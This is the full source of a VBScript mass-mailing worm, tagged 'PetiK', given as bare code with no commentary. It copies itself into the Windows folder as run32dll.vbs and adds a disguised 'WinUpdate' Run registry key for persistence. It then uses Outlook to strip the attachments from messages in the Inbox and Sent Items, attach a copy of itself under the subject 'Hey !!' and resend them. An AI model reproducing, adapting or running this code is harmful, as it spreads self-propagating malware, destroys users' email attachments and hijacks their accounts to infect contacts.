   'PetiK
   On error resume next
   randomize
   set fso=createobject("scripting.filesystemobject")
   set wscriptshell=createobject("wscript.shell")
   set drives=fso.drives
   for each drive in drives
   if drive="C:" then
   if drive.isready then
   drivefull=drive & "\"
   set e5d=fso.getfolder(drivefull)
   set subs=e5d.subfolders
   for each subfolder in subs
   subst=mid(subfolder.path,4,3)
   if subst="WIN" then
   auto=subfolder.path
   end if
   next
   end if
   end if
   next
   autos=auto & "\run32dll.vbs"
   fso.copyfile wscript.scriptfullname,autos
   wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%"
   mailed=auto & "\EMM.vbs"
   fso.copyfile wscript.scriptfullname,mailed
   if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
   set out=createobject("Outlook.Application")
   if out="Outlook" then
   set mapi=out.GetNameSpace("MAPI")
   set newitem=mapi.getdefaultfolder(6)
   do while newitem.items.count<>1
   for each item in newitem.items
   do while item.Attachments.count<>0
   for each itatt in item.Attachments
   itatt.delete
   next
   loop
   item.subject="Hey !!"
   item.Body="Important Message for you !!!"
   item.attachments.add mailed
   item.send
   next
   loop
   set item=Nothing
   set itatt=nothing
   set newitem=Nothing
   set newitem=mapi.getdefaultfolder(5)
   do while newitem.items.count<>1
   for each item in newitem.items
   do while item.Attachments.count<>0
   for each itatt in item.Attachments
   itatt.delete
   next
   loop
   item.subject="Hey !!"
   item.Body="Important Message for you !!!"
   item.attachments.add mailed
   item.send
   next
   loop
   set item=Nothing
   set itatt=nothing
   set newitem=Nothing
   set out=Nothing
   wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1"
   end if
   end if
